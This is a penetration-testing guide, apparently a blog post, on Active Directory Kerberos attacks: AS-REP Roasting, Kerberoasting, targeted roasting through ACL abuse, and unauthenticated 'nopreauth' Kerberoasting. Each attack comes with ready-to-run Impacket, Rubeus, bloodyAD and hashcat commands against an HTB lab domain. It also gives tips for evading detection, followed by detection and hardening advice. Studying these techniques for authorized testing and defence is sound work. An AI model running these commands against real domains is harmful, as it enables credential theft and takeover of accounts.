---
title: Kerberos attacks Part 0x01 
date: 2026-11-09 10:00:00 +0000
categories:
- Penetration Testing
- Guides
tags:
- PenetrationTesting
- Guides
- ActiveDirectory
- Kerberos
---

### AS-REP ROASTING, KERBEROASTING, TARGETED ROASTING & ACL ABUSE <br>

In [Part 0x00](/posts/kerberos-attacks-part0x0/), we explored how the Kerberos authentication protocol works in an Active Directory (AD) environment and broke down the three fundamental exchanges:
1. **`AS-REQ` / `AS-REP`**: Proving identity to the Key Distribution Center (KDC) to obtain a Ticket Granting Ticket (**TGT**).
2. **`TGS-REQ` / `TGS-REP`**: Presenting the TGT to the Ticket Granting Service (TGS) to obtain a service ticket (**TGS**) for a specific Service Principal Name (**SPN**).
3. **`AP-REQ` / `AP-REP`**: Presenting the service ticket directly to the target application server to authenticate.

Understanding how tickets are encrypted and exchanged is the key to understanding why Kerberos can be abused. Because Kerberos relies on symmetric cryptography—encrypting parts of responses and tickets using keys derived from user and service account passwords—any flaw that lets us obtain ciphertext encrypted with a user's key allows us to perform **offline password cracking** without ever locking out accounts.

In this second article (**Part 0x01**), we will dive deep into the offensive side of ticket requests: **AS-REP Roasting**, **Kerberoasting**, **Kerberoasting without Credentials**, and **ACL Abuse (Targeted AS-REP Roasting & Targeted Kerberoasting)**.

---

[I. Quick Recap: Where the Secret Keys Live in Kerberos](#recap)<br>
[II. AS-REP Roasting (`AS-REQ` / `AS-REP` Abuse)](#asreproasting)<br>
[III. Targeted AS-REP Roasting via ACL Abuse](#targeted-asreproasting)<br>
[IV. Kerberoasting (`TGS-REQ` / `TGS-REP` Abuse)](#kerberoasting)<br>
[V. Targeted Kerberoasting via ACL Abuse](#targeted-kerberoasting)<br>
[VI. Kerberoasting Without Credentials (`nopreauth` Trick)](#kerberoasting-no-creds)<br>
[VII. OPSEC, Detection & Defenses](#defenses)<br>
[Conclusion](#conclusion)<br>

---

# I. Quick Recap: Where the Secret Keys Live in Kerberos {#recap}

Before launching any tool, let's recall **what is encrypted with whose key** during a Kerberos exchange:

| Kerberos Message | Encrypted Component | Key Used for Encryption | Attack Surface |
| :--- | :--- | :--- | :--- |
| **`AS-REQ`** | Authenticator (`PA-ENC-TIMESTAMP`) | **User's secret key** (NTLM hash / AES key) | Requires knowing user's password *unless* Pre-Authentication is disabled. |
| **`AS-REP`** | Ticket-Granting Ticket (TGT) | **`krbtgt` secret key** | Cannot be decrypted by user (unless `krbtgt` is compromised). |
| **`AS-REP`** | Encrypted Data (`enc-part`: session key, metadata) | **User's secret key** (NTLM hash / AES key) | **AS-REP Roasting**: If we receive an `AS-REP` without knowing the password, we can crack `enc-part` offline! |
| **`TGS-REQ`** | Authenticator + TGT | **Logon Session Key** + **`krbtgt` key** | Requires a valid TGT (typically any domain user account). |
| **`TGS-REP`** | Service Ticket (`ticket.enc-part`) | **Service Account's secret key** (NTLM hash / AES key) | **Kerberoasting**: Any authenticated user can request a TGS for any SPN and crack the service ticket offline! |

Whenever the KDC sends us data encrypted with a **human-chosen password** (either in the `AS-REP` `enc-part` or the `TGS-REP` `ticket`), we can extract that encrypted blob and brute-force the password offline using `hashcat` or `john`.

---

# II. AS-REP Roasting (`AS-REQ` / `AS-REP` Abuse) {#asreproasting}

## 1. How AS-REP Roasting Works Under the Hood

As we saw in Part 0x00, standard Kerberos authentication begins with **Kerberos Pre-Authentication**:
1. The client sends an `AS-REQ` containing the `PA-ENC-TIMESTAMP` structure—the current timestamp encrypted with the key derived from the user's password.
2. The KDC looks up the user's key in `NTDS.dit` and tries to decrypt the timestamp.
3. **Only if decryption succeeds** does the KDC reply with an `AS-REP` containing:
   - The **TGT** (encrypted with the `krbtgt` key).
   - An **encrypted data block (`enc-part`)** containing the TGT session key, encrypted with the **requesting user's key**.

Why does Pre-Authentication exist? Specifically to stop an attacker from requesting an `AS-REP` for arbitrary users and cracking the `enc-part` offline!

However, for legacy compatibility reasons, Active Directory allows administrators to disable Kerberos Pre-Authentication on individual accounts via the checkbox **"Do not require Kerberos preauthentication"** in Active Directory Users and Computers (ADUC).

At the LDAP level, this setting flips the `ADS_UF_DONT_REQUIRE_PREAUTH` bit (`0x400000`, or `4194304` in decimal) in the account's `userAccountControl` attribute.

```text
Normal Flow (Pre-Auth Enabled):
Attacker  ---[ AS-REQ (No Authenticator) ]--->  KDC
Attacker  <--[ KRB5KDC_ERR_PREAUTH_REQUIRED ]-  KDC (Attack blocked)

AS-REP Roasting Flow (UF_DONT_REQUIRE_PREAUTH = 1):
Attacker  ---[ AS-REQ (For User X, No Password, RC4-HMAC requested) ]--->  KDC
Attacker  <--[ AS-REP (TGT + enc-part encrypted with User X's key)  ]----  KDC
                  │
                  └──> Extract enc-part & crack User X's password offline!
```

When `UF_DONT_REQUIRE_PREAUTH` is enabled on an account:
1. Anyone can send an `AS-REQ` for that username **without providing an encrypted timestamp**.
2. The KDC skips validation and immediately responds with a valid `AS-REP`.
3. In our `AS-REQ`, we can explicitly request **RC4-HMAC (`etype 23` / `0x17`)** encryption so that the returned `enc-part` is encrypted using the user's NTLM hash (which is much faster to crack than AES-256).
4. We extract the `enc-part` from the `AS-REP` and crack it offline.

---

## 2. Enumerating Vulnerable Accounts

If we already have valid domain credentials (or an LDAP bind), we can query Active Directory for any user object whose `userAccountControl` attribute has the `4194304` (`0x400000`) bit set:

- **Raw LDAP Filter:**
  ```ldap
  (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
  ```
  *(Note: `1.2.840.113556.1.4.803` is the LDAP bitwise `AND` matching rule OID, and `samAccountType=805306368` filters for normal user objects).*

- **Using PowerView (Windows):**
  ```powershell
  Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
  ```

- **Using ActiveDirectory Module (PowerShell):**
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
  ```

- **Using BloodHound Cypher Query:**
  ```cypher
  MATCH (u:User {dontreqpreauth: true}) RETURN u
  ```

---

## 3. Practical Exploitation

### Case A: Without Domain Credentials (Unauthenticated)
Because the KDC processes `AS-REQ` packets prior to authentication, **you do not need valid domain credentials** to perform AS-REP Roasting—you only need a list of potential usernames!

```sh
# Using Impacket's GetNPUsers.py with a username wordlist
impacket-GetNPUsers voleur.htb/ -usersfile users.txt -dc-ip 10.10.11.76 -no-pass -format hashcat -outputfile asrep_hashes.txt
```

### Case B: With Domain Credentials (Authenticated LDAP Enumeration)
If you already compromised a low-privileged domain user (or computer account), `GetNPUsers.py` or `NetExec` (`nxc`) can automatically query LDAP for all accounts with `UF_DONT_REQUIRE_PREAUTH` enabled and request their `AS-REP` hashes:

```sh
# Using Impacket GetNPUsers.py
impacket-GetNPUsers voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76 -request -format hashcat -outputfile asrep_hashes.txt

# Using NetExec (nxc)
nxc ldap 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' --asreproast asrep_hashes.txt
```

### Case C: From a Domain-Joined Windows Host (Rubeus)
When operating from a Windows beacon or foothold, **Rubeus** automatically queries LDAP and requests RC4-encrypted `AS-REP` responses:

```powershell
.\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt
```

---

## 4. Cracking the AS-REP Hash

The extracted hash follows the `$krb5asrep$23$...` format (where `23` indicates RC4-HMAC encryption, or `18` for AES-256):

```text
$krb5asrep$23$svc_backup@VOLEUR.HTB:a8c4e72f19b03812...
```

We can crack it offline using **Hashcat** (Mode `18200` for `etype 23`) or **John the Ripper**:

```sh
# Cracking with Hashcat (Mode 18200 = Kerberos 5, etype 23, AS-REP)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Cracking with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

# III. Targeted AS-REP Roasting via ACL Abuse {#targeted-asreproasting}

What if **no user in the domain** has Kerberos Pre-Authentication disabled?
If our compromised user (or a group they belong to) has permissive **Access Control List (ACL)** rights over another user object in Active Directory, we can **forcefully disable Pre-Authentication** on that target user, capture their `AS-REP` hash, and then re-enable Pre-Authentication!

## 1. Required ACL Permissions

In BloodHound or DACL enumeration, look for any of the following outbound object control edges from your controlled principal to a target `User`:
- **`GenericAll`**: Full control over the target user object.
- **`GenericWrite`**: Permission to write to almost any attribute on the target user object (including `userAccountControl`).
- **`WriteProperty`** on the `User-Account-Control` attribute (GUID: `bf967a68-0de6-11d0-a285-00aa003049e2`) or on the `Account Restrictions` property set (`4c164200-20c0-11d0-a768-00aa006e0529`).

```text
[Attacker Controlled User] ──(GenericWrite / GenericAll)──> [Target User]
         │
         ├─ 1. Modify Target's userAccountControl (+0x400000 DONT_REQ_PREAUTH)
         ├─ 2. Request AS-REP for Target User (impacket-GetNPUsers / Rubeus)
         ├─ 3. Restore Target's userAccountControl (-0x400000) for OPSEC
         └─ 4. Crack Target's password offline!
```

## 2. Step-by-Step Exploitation

### From Linux (Using `bloodyAD` + `impacket-GetNPUsers`)

**Step 1: Add the `DONT_REQ_PREAUTH` flag to the target user**
```sh
bloodyAD --host 10.10.11.76 -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' add uac 'target.user' -f DONT_REQ_PREAUTH
```
```text
[+] ['DONT_REQ_PREAUTH'] property flags added to target.user's userAccountControl
```

**Step 2: Request the AS-REP hash for `target.user`**
```sh
impacket-GetNPUsers voleur.htb/target.user -dc-ip 10.10.11.76 -no-pass -format hashcat
```

**Step 3: Clean up (Restore Pre-Authentication for OPSEC)**
Always restore the `userAccountControl` flag immediately after capturing the hash:
```sh
bloodyAD --host 10.10.11.76 -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' remove uac 'target.user' -f DONT_REQ_PREAUTH
```

### From Windows (Using PowerView + Rubeus)

```powershell
# 1. Disable Kerberos Pre-Authentication (XOR/OR 4194304 into userAccountControl)
Set-DomainObject -Identity target.user -XOR @{useraccountcontrol=4194304} -Verbose

# 2. Roast the specific target user
.\Rubeus.exe asreproast /user:target.user /format:hashcat /nowrap

# 3. Restore Kerberos Pre-Authentication (XOR again removes the bit)
Set-DomainObject -Identity target.user -XOR @{useraccountcontrol=4194304} -Verbose
```

---

# IV. Kerberoasting (`TGS-REQ` / `TGS-REP` Abuse) {#kerberoasting}

While AS-REP Roasting targets step 1 of Kerberos (`AS-REQ` / `AS-REP`), **Kerberoasting** targets step 2 (`TGS-REQ` / `TGS-REP`). It is one of the most prevalent and impactful attacks in Active Directory environments.

## 1. Role of Service Principal Names (SPNs)

In Active Directory, services (such as MSSQL, Exchange, IIS, or custom enterprise applications) run under either **computer accounts** or dedicated **domain user accounts** (service accounts).
To allow clients to locate and request Kerberos tickets for a service, the account running the service has one or more **Service Principal Names (SPNs)** registered in its `servicePrincipalName` LDAP attribute.

An SPN has the format:
```text
<ServiceClass>/<Host>:<Port>/<ServiceName>
# Examples:
MSSQLSvc/sql01.voleur.htb:1433
HTTP/web01.voleur.htb
exchangeMDB/exch01.voleur.htb
```

When a client wants to access `MSSQLSvc/sql01.voleur.htb:1433`, it sends its TGT to the KDC inside a `TGS-REQ` specifying that SPN. The KDC looks up which account owns `servicePrincipalName = MSSQLSvc/sql01.voleur.htb:1433`, builds a **Service Ticket (TGS)**, and **encrypts that Service Ticket using the secret key (NTLM hash or AES key) of the account that owns the SPN**.

---

## 2. Why Does Kerberoasting Work?

Here is the core design flaw in Kerberos that enables Kerberoasting:
> **The KDC only authenticates who you are (via your TGT); it does NOT check whether you are authorized to access the target service!**

Authorization is delegated to the target service itself (during step 3, `AP-REQ`), which inspects the user's PAC (Privilege Attribute Certificate) inside the decrypted TGS.
Consequently:
1. **Any authenticated domain user** (with a valid TGT) can ask the KDC for a Service Ticket (`TGS-REP`) for **any SPN** in the domain.
2. The KDC gladly generates the TGS and encrypts it with the **service account's secret key**.
3. Even though we never send the ticket to the actual service, we now hold a ciphertext blob (`TGS-REP` `ticket.enc-part`) encrypted with the service account's password hash!
4. Whereas computer accounts (`$`) have 120-character randomly rotated passwords (impossible to crack), **human-created service accounts** (`svc_sql`, `svc_iis`, `svc_backup`, etc.) frequently have passwords set once by an administrator—and often possess high privileges (`Domain Admins`, local administrator on servers, or `SeImpersonatePrivilege`).

```text
Kerberoasting Flow:
[Any Domain User (with TGT)]
       │
       ├── 1. Query LDAP for User Accounts where servicePrincipalName != NULL
       │      (e.g., finds svc_mssql -> MSSQLSvc/sql01.voleur.htb:1433)
       │
       ├── 2. Send TGS-REQ to KDC for SPN "MSSQLSvc/sql01.voleur.htb:1433"
       │      (Requesting RC4-HMAC / etype 23 if supported)
       │
       ├── 3. Receive TGS-REP containing Service Ticket encrypted with svc_mssql's key
       │
       └── 4. Extract TGS cipher & crack svc_mssql's password offline!
```

---

## 3. Enumerating Kerberoastable Accounts

To find user accounts (excluding `krbtgt` and computer accounts) that have an SPN registered:

- **Raw LDAP Filter:**
  ```ldap
  (&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
  ```
  *(Note: `!(UserAccountControl...:=2)` filters out disabled accounts).*

- **Using PowerView (Windows):**
  ```powershell
  Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof,pwdlastset
  ```

- **Using BloodHound Cypher Query:**
  ```cypher
  MATCH (u:User {hasspn: true}) WHERE NOT u.name STARTS WITH 'KRBTGT@' RETURN u
  ```

---

## 4. Practical Exploitation

### From Linux (Impacket & NetExec)

**1. Using `impacket-GetUserSPNs`:**
```sh
# List all Kerberoastable user accounts first
impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76

# Request TGS tickets and save in Hashcat format
impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76 -request -outputfile tgs_hashes.txt

# Request a TGS for a single specific user (Better OPSEC)
impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76 -request-user svc_mssql -outputfile svc_mssql_tgs.txt
```

What if you only have a **TGT (`.ccache` file)** from Part 0x00 instead of a plaintext password?
```sh
export KRB5CCNAME=ryan.naylor.ccache
impacket-GetUserSPNs voleur.htb/ryan.naylor -k -no-pass -dc-ip 10.10.11.76 -request -outputfile tgs_hashes.txt
```

**2. Using NetExec (`nxc`):**
```sh
nxc ldap 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' --kerberoasting tgs_hashes.txt
```

### From Windows (Rubeus)

```powershell
# Roast all Kerberoastable users in the domain
.\Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:tgs_hashes.txt

# Roast a single specific user (Stealthier)
.\Rubeus.exe kerberoast /user:svc_mssql /format:hashcat /nowrap

# OPSEC Kerberoasting: Use /tgtdeleg to force RC4 encryption or filter out AES-enabled accounts (/rc4opsec)
.\Rubeus.exe kerberoast /rc4opsec /format:hashcat /nowrap
```

---

## 5. Cracking Kerberoast Hashes (`etype 23`, `17`, `18`)

Depending on the encryption types supported by the KDC and the service account (`msDS-SupportedEncryptionTypes`), the extracted hash will use one of three Hashcat modes:

| Encryption Type | Hash Prefix | Hashcat Mode | Cracking Speed |
| :--- | :--- | :--- | :--- |
| **RC4-HMAC** (`0x17` / `23`) | `$krb5tgs$23$*...` | **`-m 13100`** | Very Fast (NTLM-based) |
| **AES-128-CTS-HMAC-SHA1-96** (`0x11` / `17`) | `$krb5tgs$17$...` | **`-m 19600`** | Slow (PBKDF2-based) |
| **AES-256-CTS-HMAC-SHA1-96** (`0x12` / `18`) | `$krb5tgs$18$...` | **`-m 19700`** | Very Slow (PBKDF2-based) |

```sh
# Cracking RC4-HMAC TGS ticket (etype 23)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Cracking AES-256 TGS ticket (etype 18)
hashcat -m 19700 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

# V. Targeted Kerberoasting via ACL Abuse {#targeted-kerberoasting}

Just like Targeted AS-REP Roasting, what if we want to compromise a high-value user account (for example, a Domain Admin or IT Administrator) that **does not have an SPN set**?

If we control an account that has **write permissions over the target user's `servicePrincipalName` attribute**, we can:
1. Register a fake, arbitrary SPN (e.g., `http/anything.voleur.htb`) on the target user account.
2. Immediately Kerberoast that user account to obtain a `TGS-REP` encrypted with the target user's password hash.
3. Delete the fake SPN to leave the object in its original state.
4. Crack the target user's password offline!

## 1. Required ACL Permissions

Look for any of these outbound permissions over a target `User`:
- **`GenericAll`**
- **`GenericWrite`**
- **`WriteProperty`** on `servicePrincipalName` (GUID: `f3a64788-5306-11d1-a9c5-0000f80367c1`) or on the `Public-Information` property set (`e48d0154-bcf8-11d1-8702-00c04fb96050`).

```text
[Attacker Controlled User] ──(GenericWrite / WriteSPN)──> [Target Admin User (No SPN)]
         │
         ├─ 1. Write fake SPN (e.g., "cifs/fake.voleur.htb") to Target's servicePrincipalName
         ├─ 2. Request TGS for "cifs/fake.voleur.htb" -> Encrypted with Target Admin's hash!
         ├─ 3. Clear Target's servicePrincipalName attribute (Cleanup)
         └─ 4. Crack Target Admin's TGS hash offline!
```

## 2. Step-by-Step Exploitation

### Automated Approach from Linux (`targetedKerberoast.py`)

`targetedKerberoast.py` (by ShutdownRepo) automates the entire process: it enumerates writable user objects, adds a temporary SPN, requests the TGS hash, and removes the temporary SPN automatically!

```sh
# Automatically find and roast all users we have WriteSPN / GenericWrite over
python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'ryan.naylor' -p 'HollowOct31Nyt' --dc-ip 10.10.11.76 -o targeted_tgs.txt

# Or target one specific user
python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'ryan.naylor' -p 'HollowOct31Nyt' --dc-ip 10.10.11.76 --request-user 'admin.user'
```

### Manual Approach from Linux (`bloodyAD` + `impacket-GetUserSPNs`)

If you prefer full manual control over the LDAP modification:

```sh
# 1. Add a fake SPN to the target user
bloodyAD --host 10.10.11.76 -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' set object 'admin.user' servicePrincipalName -v 'http/anything.voleur.htb'

# 2. Kerberoast the target user
impacket-GetUserSPNs voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76 -request-user 'admin.user' -outputfile admin_tgs.txt

# 3. Remove the fake SPN (pass empty value to clear)
bloodyAD --host 10.10.11.76 -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' set object 'admin.user' servicePrincipalName
```

### Manual Approach from Windows (PowerView + Rubeus)

```powershell
# 1. Set a fake SPN on the target user
Set-DomainObject -Identity admin.user -Set @{serviceprincipalname='http/anything.voleur.htb'} -Verbose

# 2. Roast the target user
.\Rubeus.exe kerberoast /user:admin.user /format:hashcat /nowrap

# 3. Clean up the SPN
Set-DomainObject -Identity admin.user -Clear serviceprincipalname -Verbose
```

---

# VI. Kerberoasting Without Credentials (`nopreauth` Trick) {#kerberoasting-no-creds}

Traditionally, we learn that:
- **AS-REP Roasting** does **not** require credentials (if you know a username with `DONT_REQ_PREAUTH`), because it uses `AS-REQ`.
- **Kerberoasting** **does** require credentials (a valid TGT), because it uses `TGS-REQ`.

**Wait—is it actually possible to Kerberoast service accounts WITHOUT having any valid password or TGT?**
**Yes!** In September 2022, Semperis researchers discovered that if **at least one account** in the domain has Kerberos Pre-Authentication disabled (`UF_DONT_REQUIRE_PREAUTH`), an unauthenticated attacker can use that account to **Kerberoast any SPN in the domain without knowing the account's password!**

## 1. How Unauthenticated Kerberoasting Works

Let's look closely at the structure of an **`AS-REQ`** packet (`KRB_AS_REQ`):
Normally, when a client sends an `AS-REQ` to get a TGT, the `req-body` contains two principal names:
- **`cname` (Client Name):** The user authenticating (e.g., `guest_nopreauth`).
- **`sname` (Server Name):** By default, this is set to `krbtgt/<DOMAIN>`, telling the KDC to issue a TGT encrypted with the `krbtgt` key.

```text
Standard AS-REQ:
  cname: guest_nopreauth
  sname: krbtgt/VOLEUR.HTB   <-- KDC encrypts returned ticket with krbtgt's key

Manipulated AS-REQ (Kerberoasting without Credentials):
  cname: guest_nopreauth     <-- Has UF_DONT_REQUIRE_PREAUTH enabled (No password needed!)
  sname: MSSQLSvc/sql01.voleur.htb:1433  <-- Target SPN!
```

What happens when we set **`cname`** to an account that has `UF_DONT_REQUIRE_PREAUTH` enabled, and replace **`sname`** with a target service's **SPN** (instead of `krbtgt/DOMAIN`)?
1. The KDC checks `cname` (`guest_nopreauth`) and sees that Pre-Authentication is **not required**, so it does not ask for an encrypted timestamp (`PA-ENC-TIMESTAMP`).
2. Next, the KDC looks at `sname` (`MSSQLSvc/sql01.voleur.htb:1433`). Instead of issuing a TGT encrypted with `krbtgt`'s key, the KDC directly issues a **Service Ticket encrypted with the target SPN account's key** inside the `AS-REP`!
3. Even if `guest_nopreauth` has an uncrackable 64-character password, we don't care about `guest_nopreauth`'s password anymore—we extract the **`ticket` portion of the `AS-REP`**, which is encrypted with the target SPN account's key, and crack the service account's password offline!

> **Why is this huge during a pentest?**
> Sometimes you find an AS-REP roastable account (`UF_DONT_REQUIRE_PREAUTH`), you dump its AS-REP hash, and **it fails to crack** because that specific account has a strong password. Instead of giving up, you can use that uncracked account as a stepping stone (`-no-preauth`) to roast every SPN in the domain without credentials!

---

## 2. Practical Exploitation

### Step 1: Identify or Bruteforce SPNs / Target Users
Since you don't have credentials to query LDAP for all SPNs, how do you know what `sname` to put in the `AS-REQ`?
Remarkably, in Active Directory's KDC implementation, **`sname` in an `AS-REQ` does not even need to be the full SPN string (`MSSQLSvc/host:1433`)—you can simply pass the `sAMAccountName` of any user that has an SPN registered!**
Thus, you can pass a wordlist of usernames (`users.txt`): if a username in your list has an SPN attached to it, the KDC will return its encrypted service ticket!

### Step 2: Execute Unauthenticated Kerberoasting

**From Linux (Using `impacket-GetUserSPNs`):**
Suppose we discovered that the user `mark` has `UF_DONT_REQUIRE_PREAUTH` enabled (via AS-REP Roasting), even though we don't know `mark`'s password:

```sh
# Use 'mark' (-no-preauth) + a list of potential service account usernames (-usersfile)
impacket-GetUserSPNs -no-preauth 'mark' -usersfile users.txt -dc-host 10.10.11.76 voleur.htb/ -outputfile nopreauth_tgs.txt
```

**From Windows (Using Rubeus):**
```powershell
# Using /nopreauth with a known pre-auth disabled account and a list of target users/SPNs
.\Rubeus.exe kerberoast /nopreauth:mark /domain:voleur.htb /dc:10.10.11.76 /spns:users.txt /format:hashcat /nowrap
```

The resulting hashes are standard `$krb5tgs$23$*...` (or `$18$`) hashes that can be cracked with `hashcat -m 13100` (or `-m 19700`) just like regular Kerberoasting!

---

# VII. OPSEC, Detection & Defenses {#defenses}

As penetration testers and red teamers, it is equally important to understand what telemetry these attacks generate on the Domain Controller and how defenders detect or prevent them.

## 1. Windows Event Logs & Detection Artifacts

| Attack Technique | Event ID on DC | Key Indicators for Blue Teams |
| :--- | :--- | :--- |
| **AS-REP Roasting** | **`4768`** (A Kerberos authentication ticket (TGT) was requested) | `Pre-Auth Type: 0` (No pre-authentication) combined with `Ticket Encryption Type: 0x17` (RC4-HMAC). |
| **Kerberoasting** | **`4769`** (A Kerberos service ticket was requested) | Burst of `4769` events from a single account requesting multiple SPNs, especially with `Ticket Encryption Type: 0x17` (RC4 downgrade) when the environment normally uses `0x12` (AES-256). |
| **Targeted AS-REP Roasting** | **`4738`** (A user account was changed) / **`5136`** (Directory Service object modified) | Modification of `userAccountControl` enabling `0x400000` (`DONT_REQ_PREAUTH`), followed immediately by Event `4768`, and then another `4738` reverting the flag. |
| **Targeted Kerberoasting** | **`5136`** / **`4738`** | Addition of a `servicePrincipalName` attribute on a user object by a non-administrative user, followed immediately by Event `4769` and removal of the SPN. |
| **Unauthenticated Kerberoasting** | **`4768`** | An `AS-REQ` where `Service Name` is **not** `krbtgt` and `Pre-Auth Type` is `0`. |

## 2. Offensive OPSEC Tips
- **Avoid Mass Spraying When Possible:** Instead of running `-request` across 500 SPNs at once (which triggers every SIEM rule on Event ID `4769`), enumerate LDAP first (`Get-DomainUser -SPN`), pick high-value targets (e.g., members of administrative groups or accounts with old `pwdLastSet` dates), and request tickets one by one (`-request-user`).
- **Mind Encryption Downgrades (`0x17` vs `0x12`):** Requesting RC4 (`0x17`) in a modern AES-only environment stands out immediately in Event ID `4769`. Tools like `Rubeus kerberoast /rc4opsec` only roast accounts that natively do not support AES, avoiding suspicious encryption downgrades.
- **Watch Out for Honey Tokens:** Defenders frequently create decoy user accounts with SPNs (`svc_admin_sql`) that have never logged in (`lastLogonTimestamp = 0`), knowing that any `4769` event for that SPN is 100% an active Kerberoasting attack. Always check `lastLogon` and `pwdLastSet` before requesting a ticket!

## 3. Hardening & Remediation for Blue Teams
1. **Audit and Enforce Kerberos Pre-Authentication:** Ensure no user account has `UF_DONT_REQUIRE_PREAUTH` enabled unless strictly required and documented.
2. **Use Group Managed Service Accounts (gMSA):** Migrate traditional user-based service accounts to **gMSAs**, which use 120-character complex passwords automatically rotated by Active Directory.
3. **Enforce Long Passwords (`25+` characters) on Service Accounts:** If a traditional user account must hold an SPN, enforce a password length of at least 25–30 random characters to make offline cracking infeasible.
4. **Disable RC4 (`etype 23`) and Enforce AES-256 (`etype 18`):** Configure Group Policy (`Network security: Configure encryption types allowed for Kerberos`) to disable `RC4_HMAC_MD5`. Cracking AES-256 (`-m 19700`) is thousands of times slower than cracking RC4 (`-m 13100`).
5. **Audit Dangerous ACLs:** Regularly audit Active Directory DACLs (using BloodHound / PingCastle) to remove unnecessary `GenericAll`, `GenericWrite`, and `WriteProperty` permissions granted to non-privileged users or groups.

---

# Conclusion {#conclusion}

In this second installment (**Part 0x01**), we saw how the ticket generation mechanisms from Part 0x00 can be turned into powerful credential-harvesting primitives:
- **AS-REP Roasting** abuses disabled pre-authentication (`AS-REQ` / `AS-REP`) to obtain crackable material encrypted with a user's key.
- **Kerberoasting** abuses the lack of authorization checks in `TGS-REQ` / `TGS-REP` to obtain service tickets encrypted with service accounts' keys.
- **ACL Abuse (`GenericAll` / `GenericWrite`)** lets us weaponize both attacks against **any user** we have write permissions over via **Targeted AS-REP Roasting** and **Targeted Kerberoasting**.
- **Unauthenticated Kerberoasting (`nopreauth`)** bridges both worlds—abusing a single pre-auth disabled account to Kerberoast SPNs across the domain without knowing a single password.

In the next article (**Part 0x02**), we will explore **Kerberos Delegation Attacks** (Unconstrained Delegation, Constrained Delegation with `S4U2Self` / `S4U2Proxy`, and Resource-Based Constrained Delegation — RBCD) as well as **Silver & Golden Tickets**.

Hope you learned something new by reading this article! Feel free to reach out if you spot any mistakes or want deeper explanations on a specific section.

<br>
HAPPY HACKING GEY
